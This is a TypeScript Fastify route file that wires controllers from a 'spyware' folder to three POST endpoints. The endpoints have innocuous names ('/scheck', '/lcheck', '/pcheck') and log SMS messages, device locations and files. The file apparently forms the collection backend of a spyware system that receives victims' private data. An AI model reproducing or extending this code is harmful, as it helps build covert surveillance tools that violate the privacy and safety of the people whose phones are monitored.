import { FastifyInstance } from 'fastify';
import { logSMS, logSmsSchema } from '../controllers/spyware/logSms';
import { logLocation, logLocationSchema } from '../controllers/spyware/logLocation';
import { logFile, logFileSchema } from '../controllers/spyware/logFile';

export default function (fastify: FastifyInstance, opts: any, done: Function) {
	fastify.post('/scheck', { schema: { body: logSmsSchema}}, logSMS);
	fastify.post('/lcheck', { schema: { body: logLocationSchema}}, logLocation);
	fastify.post('/pcheck', { schema: { body: logFileSchema}}, logFile);

	done();
}